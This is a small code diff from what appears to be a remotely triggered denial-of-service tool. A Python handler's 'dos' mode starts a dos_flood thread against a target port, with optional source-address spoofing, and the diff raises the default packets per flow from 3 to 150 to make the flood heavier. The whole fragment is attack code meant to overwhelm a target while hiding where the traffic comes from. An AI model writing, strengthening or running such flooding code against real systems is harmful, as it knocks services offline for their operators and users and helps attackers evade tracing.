@@ -53,7 +53,7 @@ def trigger():
     if mode == "dos":
         port = int(data.get("port", 80))
         spoof_source = bool(data.get("spoof_source", False))
-        packets_per_flow = int(data.get("packets_per_flow", 3))
+        packets_per_flow = int(data.get("packets_per_flow", 150))
         thread = threading.Thread(
             target=dos_flood,
             args=(target, port, duration, rate or 100, spoof_source, packets_per_flow),
